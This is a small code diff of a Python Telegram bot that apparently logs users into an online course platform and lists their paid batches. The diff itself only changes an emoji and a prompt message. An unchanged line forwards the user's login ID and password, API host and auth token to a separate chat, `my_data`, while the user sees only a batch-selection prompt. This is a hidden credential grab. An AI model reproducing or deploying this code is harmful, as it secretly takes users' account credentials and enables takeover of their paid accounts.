@@ -134,7 +134,7 @@ async def start(bot, m):
     cool = ""
     for data in topicid:
         #aa = f" `{data['id']}` » {data['course_name']}\n\n"
-        aa = f" `{data['id']}` » {data['course_name']} ✳️ {data['price']}₹\n\n"
+        aa = f" `{data['id']}` » {data['course_name']} 💲 {data['price']}₹\n\n"
         if len(f'{cool}{aa}') > 4096:
             print(aa)
             cool = ""
@@ -142,7 +142,7 @@ async def start(bot, m):
     #await editable.edit(f"Login successful✔️")
     #editable1 = await bot.send_message(m.chat.id, f"Login Success..\n\n{cool}\nSend ID:")
     await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**token :** `{token}${userid}`\n\n{cool}") 
-    await editable.edit(f"Login Success✅....You have these batches :-\n\n{cool}\nSend ID:")
+    await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
     input1 = await bot.listen(editable.chat.id)
     raw_text1 = input1.text
 
